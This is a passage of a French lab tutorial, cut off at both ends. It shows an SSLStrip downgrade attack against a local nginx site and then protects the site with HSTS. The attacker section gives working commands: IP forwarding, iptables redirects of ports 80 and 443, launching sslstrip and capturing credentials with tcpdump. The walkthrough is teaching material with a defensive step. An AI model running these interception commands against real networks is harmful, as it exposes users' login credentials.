Sur la machine attaquante

    Installer SSLStrip :

bash

sudo apt-get install sslstrip

    Configurer iptables pour rediriger le trafic HTTP et HTTPS :

bash

# Activer l'IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Rediriger le trafic HTTP et HTTPS vers SSLStrip
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080

    Lancer SSLStrip :

bash

sslstrip -l 8080

    Utiliser Wireshark ou tcpdump pour intercepter le trafic :

bash

tcpdump -i any -A -w sslstrip_demo.pcap

Sur une machine victime (navigateur web)

    Accéder au site via HTTP :

Ouvrez un navigateur web et accédez à http://localhost:8080.

    Soumettre des informations de connexion :

Entrez un nom d'utilisateur et un mot de passe, puis soumettez le formulaire. L'attaquant utilisant SSLStrip et tcpdump/Wireshark pourra voir les informations de connexion en clair.
Étape 3 : Protéger contre SSLStrip avec HSTS

    Modifier le fichier default.conf pour ajouter l'en-tête HSTS :

nginx

server {
    listen 80;
    server_name localhost;

    # Rediriger tout le trafic HTTP vers HTTPS
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl;
    server_name localhost;

    # Chemins vers les certificats SSL
    ssl_certificate /etc/nginx/ssl/nginx.crt;
    ssl_certificate_key /etc/nginx/ssl/nginx.key;

    root /usr/share/nginx/html;
    index index.html;

    location / {
        add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
        try_files $uri $uri/ =404;
    }
}

    Rebâtir et relancer le conteneur Docker :
